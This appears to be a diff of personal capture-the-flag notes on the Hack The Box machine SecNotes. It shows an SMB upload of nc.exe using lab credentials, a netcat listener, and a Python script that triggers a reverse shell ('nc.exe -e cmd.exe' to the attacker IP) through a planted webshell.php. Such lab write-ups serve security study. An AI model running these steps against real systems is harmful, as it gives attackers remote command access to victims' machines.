@@ -225,3 +225,60 @@ smbclient '//10.129.6.180/new-site' -U 'tyler' --password '92g!mA8BGjOirkL%OG*&'
 neat. i can drop sysinternals `handle.exe` on this.
 
 handle.exe -accepteula
+
+okay. well. that's not useful..
+
+I'm cheating again and am looking at the hints. apparently WSL exists.
+    > What is the full path to the folder that is the root of the WSL instance running on SecNotes?
+
+windows default wsl location
+hm. no clue.
+
+z.ai copy paste. yay!
+
+    C:\Users\tyler\AppData\Local\Packages\<DistroPackage>\LocalState\rootfs
+    dir C:\Users\tyler\AppData\Local\Packages\
+
+this is annoying. I want to upgrade this shell. `webshellrepl.py` is useful but not a good shell. just a dumb repl.
+
+z.ai copy paste. wow!!!!!! thank you China my beloved.
+
+/usr/share/seclists/Web-Shells/FuzzDB/nc.exe
+
+now to upload netcat `nc.exe` so we can rev shell with a better interface.
+
+```bash
+export HTBIP=10.129.7.134
+
+# this uploads nc.exe to the victim's filesystem
+smbclient "//$HTBIP/new-site" -U 'tyler' --password '92g!mA8BGjOirkL%OG*&' -c 'put /usr/share/seclists/Web-Shells/FuzzDB/nc.exe nc.exe'
+
+# this opens a listener on the attacker machine to wait for victim to connect
+# rlwrap just makes term nicer
+rlwrap nc -lvnp 4444
+```
+
+```py
+# this script causes the victim to execute nc.exe to connect to our listener so we can send commands to them
+import urllib.parse
+attacker_ip='10.10.14.175'
+victim_ip='10.129.7.134'
+
+# nc.exe%20-e%20cmd.exe%20<TUN_IP>%204444"
+payload = f"nc.exe -e cmd.exe {attacker_ip} 4444"
+
+# url encode payload for http get body
+payload = urllib.parse.quote(payload)
+
+# build url with payload
+url = f"http://{victim_ip}:8808/webshell.php?cmd={payload}"
+print(url)
+
+# send payload and trigger rev shell
+import requests
+from pprint import pprint
+reply = requests.get(url)
+pprint(reply)
+if(reply.status_code>=400):
+    print("error. webshell likely doesn't exist, go upload it again.")
+```
